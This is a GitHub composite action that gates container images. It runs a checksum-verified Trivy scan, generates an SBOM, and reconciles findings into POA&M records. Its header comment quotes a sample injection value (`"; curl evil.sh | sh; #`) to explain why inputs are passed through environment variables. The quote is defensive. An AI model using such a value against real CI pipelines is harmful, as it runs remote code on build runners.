name: "Container Security Gate"
description: "Scan a digest-pinned image, reconcile against prior POA&M state, and enforce policy."

# SECURITY NOTE ON THIS FILE
# Every ${{ inputs.* }} value is passed through `env:` and referenced as a shell
# variable ("$IMAGE_REF"), never interpolated directly into a run: block.
# Direct interpolation is template substitution that happens BEFORE the shell
# parses the line, so an input containing `"; curl evil.sh | sh; #` executes as
# code. These inputs cross a trust boundary (a caller repo supplies them), and a
# security gate does not get to be the injection vector.

inputs:
  image_ref:
    description: "Digest-pinned image reference, e.g. myacr.azurecr.us/team/api@sha256:..."
    required: true
  component_id:
    description: "Stable identity for POA&M continuity across releases. NOT the version tag."
    required: true
  image_tag:
    description: "Human-readable tag, recorded as metadata only. Never used for identity."
    required: false
    default: ""
  policy_profile:
    description: "Policy profile name under policies/ (fedramp-moderate | standard | observe)"
    required: false
    default: "standard"
  registry:
    description: "ACR login server, e.g. myacr.azurecr.us"
    required: true
  state_store:
    description: "az://<account>/<container> or local://<path>"
    required: true
  azure_environment:
    description: "public | usgovernment"
    required: false
    default: "usgovernment"
  trivy_version:
    description: "Pinned Trivy version. Do not use 'latest'."
    required: false
    default: "0.58.1"
  trivy_sha256:
    description: "Expected SHA-256 of the Trivy tarball. Required unless trivy_binary_ref is set."
    required: false
    default: ""
  trivy_binary_ref:
    description: "OCI ref of an internally vendored Trivy binary. Preferred in Gov; avoids github.com egress."
    required: false
    default: ""
  oras_version:
    description: "ORAS version. Only used when trivy_binary_ref is set."
    required: false
    default: "1.2.0"
  oras_sha256:
    required: false
    default: ""
  db_repository:
    description: "Mirrored trivy-db OCI ref. Leave blank only if runners can reach ghcr.io."
    required: false
    default: ""
  java_db_repository:
    description: "Mirrored trivy-java-db OCI ref."
    required: false
    default: ""
  max_db_age_hours:
    description: "Fail if the vulnerability DB is older than this. A silently stale DB passes everything."
    required: false
    default: "48"
  exceptions_repo:
    description: "Central exception store, e.g. myorg/security-exceptions. Teams must not self-approve."
    required: false
    default: ""
  exceptions_ref:
    required: false
    default: "main"
  exceptions_token:
    description: "Read token for the exception repo. Pass a secret here."
    required: false
    default: ""
  bypass:
    description: "Emergency bypass. Must come from an environment-gated job, never a raw input."
    required: false
    default: "false"
  bypass_reason:
    required: false
    default: ""
  bypass_actor:
    required: false
    default: ""
  dce_endpoint:
    required: false
    default: ""
  dcr_immutable_id:
    required: false
    default: ""
  upload_artifacts:
    description: "Also attach the POA&M to the workflow run. Off by default: POA&M content is sensitive."
    required: false
    default: "false"

outputs:
  gate_result:
    description: "pass | fail | pass_with_bypass"
    value: ${{ steps.gate.outputs.gate_result }}
  gate_passed:
    description: "true when the gate did not fail"
    value: ${{ steps.gate.outputs.gate_passed }}
  is_initial_scan:
    description: "true when no prior POA&M state existed for this component"
    value: ${{ steps.gate.outputs.is_initial_scan }}
  new_count:
    description: "Findings first seen in this scan"
    value: ${{ steps.gate.outputs.new_count }}
  closed_count:
    description: "Findings remediated since the previous scan"
    value: ${{ steps.gate.outputs.closed_count }}
  reopened_count:
    description: "Previously closed findings that returned"
    value: ${{ steps.gate.outputs.reopened_count }}
  overdue_count:
    description: "Open items past their scheduled completion date"
    value: ${{ steps.gate.outputs.overdue_count }}
  critical_open:
    description: "Open CRITICAL findings excluding approved deviations"
    value: ${{ steps.gate.outputs.critical_open }}
  high_open:
    description: "Open HIGH findings excluding approved deviations"
    value: ${{ steps.gate.outputs.high_open }}
  poam_uri:
    description: "Blob URI of the generated POA&M workbook"
    value: ${{ steps.gate.outputs.poam_uri }}
  sbom_uri:
    description: "Blob URI of the generated SBOM"
    value: ${{ steps.gate.outputs.sbom_uri }}
  image_digest:
    description: "Digest that was scanned"
    value: ${{ steps.gate.outputs.image_digest }}

runs:
  using: "composite"
  steps:
    - name: Validate inputs
      shell: bash
      env:
        IMAGE_REF: ${{ inputs.image_ref }}
        COMPONENT_ID: ${{ inputs.component_id }}
        POLICY_PROFILE: ${{ inputs.policy_profile }}
        ACTION_PATH: ${{ github.action_path }}
      run: |
        set -euo pipefail

        if [[ "$IMAGE_REF" != *"@sha256:"* ]]; then
          echo "::error::image_ref must be digest-pinned (…@sha256:…). A tag is mutable,"
          echo "::error::so the image scanned would not provably be the image deployed."
          exit 1
        fi

        if [[ "$COMPONENT_ID" == *"@"* || "$COMPONENT_ID" == *":"* ]]; then
          echo "::error::component_id looks like an image ref. It must be a stable identity"
          echo "::error::(e.g. org/repo/api) that does NOT change between releases."
          exit 1
        fi

        # Allow-list, not blocklist. component_id becomes a storage path segment.
        if ! [[ "$COMPONENT_ID" =~ ^[A-Za-z0-9._/-]+$ ]]; then
          echo "::error::component_id may only contain A-Z a-z 0-9 . _ - /"
          exit 1
        fi

        if ! [[ "$POLICY_PROFILE" =~ ^[a-z0-9-]+$ ]]; then
          echo "::error::policy_profile must be a bare profile name, not a path."
          exit 1
        fi

        if [[ ! -f "${ACTION_PATH}/policies/${POLICY_PROFILE}.yaml" ]]; then
          echo "::error::Unknown policy profile '${POLICY_PROFILE}'. Available:"
          ls -1 "${ACTION_PATH}/policies/" | sed 's/\.yaml$//' | sed 's/^/::error::  - /'
          exit 1
        fi

    - name: Check out central exception store
      if: inputs.exceptions_repo != ''
      uses: actions/checkout@v4
      with:
        repository: ${{ inputs.exceptions_repo }}
        ref: ${{ inputs.exceptions_ref }}
        path: .security-exceptions
        token: ${{ inputs.exceptions_token || github.token }}
        persist-credentials: false

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: "3.12"

    - name: Install gate engine
      shell: bash
      env:
        ACTION_PATH: ${{ github.action_path }}
      run: |
        set -euo pipefail
        # github.action_path is where the runner already checked this action out.
        # No second checkout, and no dependence on the caller's working directory.
        if [[ -f "$ACTION_PATH/requirements.lock" ]]; then
          pip install --quiet --require-hashes -r "$ACTION_PATH/requirements.lock"
          pip install --quiet --no-deps "$ACTION_PATH"
        else
          echo "::warning::requirements.lock absent; installing without hash pinning."
          pip install --quiet "$ACTION_PATH[azure]"
        fi
        poam --help > /dev/null
        echo "GATE_DIR=$ACTION_PATH" >> "$GITHUB_ENV"

    - name: Install ORAS
      if: inputs.trivy_binary_ref != ''
      shell: bash
      env:
        ORAS_VERSION: ${{ inputs.oras_version }}
        ORAS_SHA256: ${{ inputs.oras_sha256 }}
      run: |
        set -euo pipefail
        if command -v oras > /dev/null; then
          echo "ORAS already present: $(oras version | head -1)"
          exit 0
        fi
        cd "$RUNNER_TEMP"
        TARBALL="oras_${ORAS_VERSION}_linux_amd64.tar.gz"
        curl -fsSL --retry 3 -o "$TARBALL" \
          "https://github.com/oras-project/oras/releases/download/v${ORAS_VERSION}/${TARBALL}"
        if [[ -n "$ORAS_SHA256" ]]; then
          echo "${ORAS_SHA256}  ${TARBALL}" | sha256sum -c -
        else
          echo "::warning::oras_sha256 not supplied; ORAS binary is unverified."
        fi
        tar -xzf "$TARBALL" oras
        mkdir -p "$HOME/.local/bin"
        install -m 0755 oras "$HOME/.local/bin/oras"
        echo "$HOME/.local/bin" >> "$GITHUB_PATH"

    - name: Install Trivy (checksum-verified)
      shell: bash
      env:
        TRIVY_VERSION: ${{ inputs.trivy_version }}
        TRIVY_SHA256: ${{ inputs.trivy_sha256 }}
        TRIVY_BINARY_REF: ${{ inputs.trivy_binary_ref }}
      run: |
        set -euo pipefail
        mkdir -p "$RUNNER_TEMP/trivy-install"
        cd "$RUNNER_TEMP/trivy-install"

        if [[ -n "$TRIVY_BINARY_REF" ]]; then
          echo "Pulling vendored Trivy from $TRIVY_BINARY_REF"
          oras pull "$TRIVY_BINARY_REF" -o .
          if ls trivy_*.tar.gz > /dev/null 2>&1; then
            tar -xzf trivy_*.tar.gz
          fi
        else
          if [[ -z "$TRIVY_SHA256" ]]; then
            echo "::error::Either trivy_sha256 or trivy_binary_ref must be set."
            echo "::error::Running an unverified scanner binary defeats the purpose of the gate."
            exit 1
          fi
          TARBALL="trivy_${TRIVY_VERSION}_Linux-64bit.tar.gz"
          curl -fsSL --retry 3 -o "$TARBALL" \
            "https://github.com/aquasecurity/trivy/releases/download/v${TRIVY_VERSION}/${TARBALL}"
          if ! echo "${TRIVY_SHA256}  ${TARBALL}" | sha256sum -c -; then
            echo "::error::Trivy checksum mismatch. Refusing to execute the binary."
            echo "::error::Expected ${TRIVY_SHA256}"
            echo "::error::Actual   $(sha256sum "$TARBALL" | cut -d' ' -f1)"
            exit 1
          fi
          tar -xzf "$TARBALL"
        fi

        if [[ ! -x ./trivy ]]; then
          echo "::error::No trivy binary found after extraction."
          exit 1
        fi
        mkdir -p "$HOME/.local/bin"
        install -m 0755 ./trivy "$HOME/.local/bin/trivy"
        echo "$HOME/.local/bin" >> "$GITHUB_PATH"
        "$HOME/.local/bin/trivy" --version

    - name: Check required tooling
      shell: bash
      run: |
        set -euo pipefail
        MISSING=()
        for tool in jq az; do
          command -v "$tool" > /dev/null || MISSING+=("$tool")
        done
        if (( ${#MISSING[@]} > 0 )); then
          echo "::error::Missing required tools on this runner: ${MISSING[*]}"
          echo "::error::Install them in the runner image; the gate depends on them."
          exit 1
        fi

    - name: Authenticate to ACR
      shell: bash
      env:
        REGISTRY: ${{ inputs.registry }}
      run: |
        set -euo pipefail
        ACR_NAME="${REGISTRY%%.*}"
        TOKEN=$(az acr login --name "$ACR_NAME" --expose-token --output tsv --query accessToken)
        echo "::add-mask::$TOKEN"
        # Masked in logs, but still a token in the job env file. Keep gate jobs
        # on trusted runners and do not reuse the job for untrusted steps.
        {
          echo "TRIVY_USERNAME=00000000-0000-0000-0000-000000000000"
          echo "TRIVY_PASSWORD=$TOKEN"
        } >> "$GITHUB_ENV"

    - name: Refresh vulnerability database
      shell: bash
      env:
        DB_REPO: ${{ inputs.db_repository }}
        JAVA_DB_REPO: ${{ inputs.java_db_repository }}
      run: |
        set -euo pipefail
        ARGS=()
        [[ -n "$DB_REPO" ]] && ARGS+=(--db-repository "$DB_REPO")
        [[ -n "$JAVA_DB_REPO" ]] && ARGS+=(--java-db-repository "$JAVA_DB_REPO")

        trivy image --download-db-only ${ARGS[@]+"${ARGS[@]}"}

        # Persist as one-arg-per-line so later steps keep correct quoting
        # instead of flattening the array into a word-split string.
        : > "$RUNNER_TEMP/db-args.txt"
        for a in ${ARGS[@]+"${ARGS[@]}"}; do printf '%s\n' "$a" >> "$RUNNER_TEMP/db-args.txt"; done

        trivy --version | head -1 | sed 's/^/TRIVY_VERSION_FULL=/' >> "$GITHUB_ENV"

    - name: Verify database freshness
      shell: bash
      env:
        MAX_AGE: ${{ inputs.max_db_age_hours }}
      run: |
        set -euo pipefail
        CACHE="${TRIVY_CACHE_DIR:-$HOME/.cache/trivy}"
        META="$CACHE/db/metadata.json"
        if [[ ! -f "$META" ]]; then
          echo "::warning::No DB metadata at $META; cannot verify freshness."
          exit 0
        fi

        UPDATED=$(jq -r '.UpdatedAt // empty' "$META")
        NEXT=$(jq -r '.NextUpdate // empty' "$META")
        {
          echo "DB_UPDATED_AT=$UPDATED"
          echo "DB_NEXT_UPDATE=$NEXT"
        } >> "$GITHUB_ENV"

        AGE=$(( ( $(date -u +%s) - $(date -u -d "$UPDATED" +%s) ) / 3600 ))
        echo "Vulnerability DB is ${AGE}h old (updated $UPDATED)"
        if (( AGE > MAX_AGE )); then
          echo "::error::Vulnerability DB is ${AGE}h old, exceeding max_db_age_hours=${MAX_AGE}."
          echo "::error::A stale DB silently passes images. Check the trivy-db mirror job."
          exit 1
        fi

    - name: Scan image
      shell: bash
      env:
        IMAGE_REF: ${{ inputs.image_ref }}
      run: |
        set -euo pipefail
        mkdir -p "$RUNNER_TEMP/gate"
        mapfile -t DB_ARGS < "$RUNNER_TEMP/db-args.txt"

        # Deliberately NO --ignorefile. Exceptions are applied downstream so the
        # finding still lands in the POA&M as a documented deviation instead of
        # disappearing from the record entirely.
        trivy image \
          --format json \
          --output "$RUNNER_TEMP/gate/scan.json" \
          --scanners vuln \
          --skip-db-update \
          --timeout 15m \
          ${DB_ARGS[@]+"${DB_ARGS[@]}"} \
          "$IMAGE_REF"

    - name: Generate SBOM
      shell: bash
      env:
        IMAGE_REF: ${{ inputs.image_ref }}
      run: |
        set -euo pipefail
        mapfile -t DB_ARGS < "$RUNNER_TEMP/db-args.txt"
        trivy image \
          --format spdx-json \
          --output "$RUNNER_TEMP/gate/sbom.spdx.json" \
          --skip-db-update \
          ${DB_ARGS[@]+"${DB_ARGS[@]}"} \
          "$IMAGE_REF"

    - name: Evaluate gate and generate POA&M
      id: gate
      shell: bash
      env:
        IMAGE_REF: ${{ inputs.image_ref }}
        COMPONENT_ID: ${{ inputs.component_id }}
        IMAGE_TAG: ${{ inputs.image_tag }}
        POLICY_PROFILE: ${{ inputs.policy_profile }}
        STATE_STORE: ${{ inputs.state_store }}
        AZ_ENVIRONMENT: ${{ inputs.azure_environment }}
        BYPASS: ${{ inputs.bypass }}
        BYPASS_REASON: ${{ inputs.bypass_reason }}
        BYPASS_ACTOR: ${{ inputs.bypass_actor }}
        DCE_ENDPOINT: ${{ inputs.dce_endpoint }}
        DCR_IMMUTABLE_ID: ${{ inputs.dcr_immutable_id }}
        GATE_VERSION: ${{ github.action_ref }}
      run: |
        set -euo pipefail

        ARGS=(
          --trivy-json "$RUNNER_TEMP/gate/scan.json"
          --sbom "$RUNNER_TEMP/gate/sbom.spdx.json"
          --component-id "$COMPONENT_ID"
          --image-ref "$IMAGE_REF"
          --image-tag "$IMAGE_TAG"
          --policy "$GATE_DIR/policies/${POLICY_PROFILE}.yaml"
          --store "$STATE_STORE"
          --environment "$AZ_ENVIRONMENT"
          --out-dir "$RUNNER_TEMP/gate/out"
          --trivy-version "${TRIVY_VERSION_FULL:-unknown}"
          --db-updated-at "${DB_UPDATED_AT:-}"
          --db-next-update "${DB_NEXT_UPDATE:-}"
          --gate-version "${GATE_VERSION:-v1}"
          --dce-endpoint "$DCE_ENDPOINT"
          --dcr-immutable-id "$DCR_IMMUTABLE_ID"
        )

        if [[ -d "$GITHUB_WORKSPACE/.security-exceptions" ]]; then
          ARGS+=(--exceptions "$GITHUB_WORKSPACE/.security-exceptions")
        fi

        if [[ "$BYPASS" == "true" ]]; then
          ARGS+=(--bypass --bypass-reason "$BYPASS_REASON" --bypass-actor "$BYPASS_ACTOR")
        fi

        poam gate "${ARGS[@]}"

    - name: Attach POA&M to workflow run
      if: always() && inputs.upload_artifacts == 'true'
      uses: actions/upload-artifact@v4
      with:
        name: poam-${{ github.run_id }}
        path: ${{ runner.temp }}/gate/out/
        retention-days: 30
